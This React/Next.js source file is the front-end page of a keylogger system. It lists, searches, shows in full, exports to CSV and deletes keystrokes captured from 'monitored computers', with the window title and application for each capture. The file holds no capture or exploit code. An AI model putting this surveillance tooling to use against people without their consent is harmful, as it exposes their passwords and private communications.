"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Keyboard,
  Search,
  Calendar,
  Laptop,
  AppWindow,
  Eye,
  Trash2,
  RefreshCw,
  Download,
  Filter,
  ChevronLeft,
  ChevronRight,
} from "lucide-react";
import { format, formatDistanceToNow } from "date-fns";
import { toast } from "sonner";

interface Computer {
  id: string;
  name: string;
  hostname: string;
}

interface Keylog {
  id: string;
  computerId: string;
  computer: { id: string; name: string; hostname: string };
  windowTitle: string | null;
  application: string | null;
  keystrokes: string;
  capturedAt: string;
}

export default function KeyloggerPage() {
  const [computers, setComputers] = useState<Computer[]>([]);
  const [keylogs, setKeylogs] = useState<Keylog[]>([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(true);
  const [selectedComputer, setSelectedComputer] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [dateFrom, setDateFrom] = useState("");
  const [dateTo, setDateTo] = useState("");
  const [offset, setOffset] = useState(0);
  const [selectedKeylog, setSelectedKeylog] = useState<Keylog | null>(null);
  const limit = 50;

  useEffect(() => {
    fetchComputers();
  }, []);

  useEffect(() => {
    fetchKeylogs();
  }, [selectedComputer, searchQuery, dateFrom, dateTo, offset]);

  async function fetchComputers() {
    try {
      const res = await fetch("/api/computers");
      if (res.ok) {
        const data = await res.json();
        setComputers(data);
      }
    } catch (error) {
      console.error("Failed to fetch computers:", error);
    }
  }

  async function fetchKeylogs() {
    setLoading(true);
    try {
      const params = new URLSearchParams();
      if (selectedComputer !== "all") params.append("computerId", selectedComputer);
      if (searchQuery) params.append("search", searchQuery);
      if (dateFrom) params.append("startDate", dateFrom);
      if (dateTo) params.append("endDate", dateTo);
      params.append("limit", limit.toString());
      params.append("offset", offset.toString());

      const res = await fetch(`/api/keylogs?${params.toString()}`);
      if (res.ok) {
        const data = await res.json();
        setKeylogs(data.keylogs);
        setTotal(data.total);
      }
    } catch (error) {
      console.error("Failed to fetch keylogs:", error);
    } finally {
      setLoading(false);
    }
  }

  async function deleteKeylogs() {
    if (!confirm("Are you sure you want to delete all keylogs? This action cannot be undone.")) {
      return;
    }

    try {
      const params = new URLSearchParams();
      if (selectedComputer !== "all") params.append("computerId", selectedComputer);

      const res = await fetch(`/api/keylogs?${params.toString()}`, {
        method: "DELETE",
      });

      if (res.ok) {
        const data = await res.json();
        toast.success(`Deleted ${data.deleted} keylog entries`);
        fetchKeylogs();
      } else {
        toast.error("Failed to delete keylogs");
      }
    } catch (error) {
      toast.error("Failed to delete keylogs");
      console.error(error);
    }
  }

  function exportKeylogs() {
    const data = keylogs.map((k) => ({
      computer: k.computer.name,
      application: k.application,
      window: k.windowTitle,
      keystrokes: k.keystrokes,
      timestamp: format(new Date(k.capturedAt), "yyyy-MM-dd HH:mm:ss"),
    }));

    const csv = [
      ["Computer", "Application", "Window Title", "Keystrokes", "Timestamp"].join(","),
      ...data.map((row) =>
        [
          `"${row.computer}"`,
          `"${row.application || ""}"`,
          `"${row.window || ""}"`,
          `"${row.keystrokes.replace(/"/g, '""')}"`,
          row.timestamp,
        ].join(",")
      ),
    ].join("\n");

    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `keylogs-${format(new Date(), "yyyy-MM-dd")}.csv`;
    a.click();
    URL.revokeObjectURL(url);
    toast.success("Keylogs exported successfully");
  }

  const totalPages = Math.ceil(total / limit);
  const currentPage = Math.floor(offset / limit) + 1;

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold flex items-center gap-2">
            <Keyboard className="h-8 w-8" />
            Keylogger
          </h1>
          <p className="text-muted-foreground">
            View captured keystrokes from monitored computers
          </p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" onClick={fetchKeylogs}>
            <RefreshCw className="h-4 w-4 mr-2" />
            Refresh
          </Button>
          <Button variant="outline" onClick={exportKeylogs} disabled={keylogs.length === 0}>
            <Download className="h-4 w-4 mr-2" />
            Export
          </Button>
          <Button variant="destructive" onClick={deleteKeylogs} disabled={keylogs.length === 0}>
            <Trash2 className="h-4 w-4 mr-2" />
            Delete All
          </Button>
        </div>
      </div>

      {/* Filters */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Filter className="h-5 w-5" />
            Filters
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid gap-4 md:grid-cols-4">
            <div>
              <Label>Computer</Label>
              <Select value={selectedComputer} onValueChange={(v) => { setSelectedComputer(v); setOffset(0); }}>
                <SelectTrigger>
                  <SelectValue placeholder="All computers" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Computers</SelectItem>
                  {computers.map((c) => (
                    <SelectItem key={c.id} value={c.id}>
                      {c.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label>Search</Label>
              <div className="relative">
                <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search keystrokes..."
                  className="pl-8"
                  value={searchQuery}
                  onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
                />
              </div>
            </div>
            <div>
              <Label>From Date</Label>
              <Input
                type="date"
                value={dateFrom}
                onChange={(e) => { setDateFrom(e.target.value); setOffset(0); }}
              />
            </div>
            <div>
              <Label>To Date</Label>
              <Input
                type="date"
                value={dateTo}
                onChange={(e) => { setDateTo(e.target.value); setOffset(0); }}
              />
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Stats */}
      <div className="grid gap-4 md:grid-cols-3">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Total Entries
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{total.toLocaleString()}</div>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Computers Monitored
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">
              {new Set(keylogs.map((k) => k.computerId)).size}
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Total Keystrokes
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">
              {keylogs.reduce((acc, k) => acc + k.keystrokes.length, 0).toLocaleString()}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Keylogs Table */}
      <Card>
        <CardHeader>
          <CardTitle>Captured Keystrokes</CardTitle>
          <CardDescription>
            Showing {offset + 1} - {Math.min(offset + limit, total)} of {total} entries
          </CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex items-center justify-center h-48">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
            </div>
          ) : keylogs.length === 0 ? (
            <div className="text-center py-12 text-muted-foreground">
              <Keyboard className="h-12 w-12 mx-auto mb-4 opacity-50" />
              <p>No keylog entries found</p>
            </div>
          ) : (
            <>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Computer</TableHead>
                    <TableHead>Application</TableHead>
                    <TableHead>Window Title</TableHead>
                    <TableHead>Keystrokes</TableHead>
                    <TableHead>Captured At</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {keylogs.map((keylog) => (
                    <TableRow key={keylog.id}>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <Laptop className="h-4 w-4 text-muted-foreground" />
                          <span className="font-medium">{keylog.computer.name}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        {keylog.application && (
                          <Badge variant="outline" className="gap-1">
                            <AppWindow className="h-3 w-3" />
                            {keylog.application}
                          </Badge>
                        )}
                      </TableCell>
                      <TableCell className="max-w-xs truncate text-muted-foreground">
                        {keylog.windowTitle || "-"}
                      </TableCell>
                      <TableCell className="max-w-xs">
                        <code className="bg-muted px-2 py-1 rounded text-sm truncate block max-w-[200px]">
                          {keylog.keystrokes.length > 50
                            ? keylog.keystrokes.substring(0, 50) + "..."
                            : keylog.keystrokes}
                        </code>
                      </TableCell>
                      <TableCell className="text-muted-foreground">
                        <div className="flex items-center gap-1">
                          <Calendar className="h-3 w-3" />
                          {formatDistanceToNow(new Date(keylog.capturedAt), { addSuffix: true })}
                        </div>
                      </TableCell>
                      <TableCell>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => setSelectedKeylog(keylog)}
                        >
                          <Eye className="h-4 w-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>

              {/* Pagination */}
              <div className="flex items-center justify-between mt-4">
                <p className="text-sm text-muted-foreground">
                  Page {currentPage} of {totalPages}
                </p>
                <div className="flex gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setOffset(Math.max(0, offset - limit))}
                    disabled={offset === 0}
                  >
                    <ChevronLeft className="h-4 w-4" />
                    Previous
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setOffset(offset + limit)}
                    disabled={offset + limit >= total}
                  >
                    Next
                    <ChevronRight className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </>
          )}
        </CardContent>
      </Card>

      {/* Keylog Detail Dialog */}
      <Dialog open={!!selectedKeylog} onOpenChange={() => setSelectedKeylog(null)}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Keylog Details</DialogTitle>
            <DialogDescription>
              Full keystroke capture information
            </DialogDescription>
          </DialogHeader>
          {selectedKeylog && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-muted-foreground">Computer</Label>
                  <p className="font-medium">{selectedKeylog.computer.name}</p>
                </div>
                <div>
                  <Label className="text-muted-foreground">Captured At</Label>
                  <p className="font-medium">
                    {format(new Date(selectedKeylog.capturedAt), "PPpp")}
                  </p>
                </div>
                <div>
                  <Label className="text-muted-foreground">Application</Label>
                  <p className="font-medium">{selectedKeylog.application || "N/A"}</p>
                </div>
                <div>
                  <Label className="text-muted-foreground">Window Title</Label>
                  <p className="font-medium">{selectedKeylog.windowTitle || "N/A"}</p>
                </div>
              </div>
              <div>
                <Label className="text-muted-foreground">Keystrokes</Label>
                <ScrollArea className="h-48 mt-2">
                  <pre className="bg-muted p-4 rounded-lg text-sm whitespace-pre-wrap break-words font-mono">
                    {selectedKeylog.keystrokes}
                  </pre>
                </ScrollArea>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
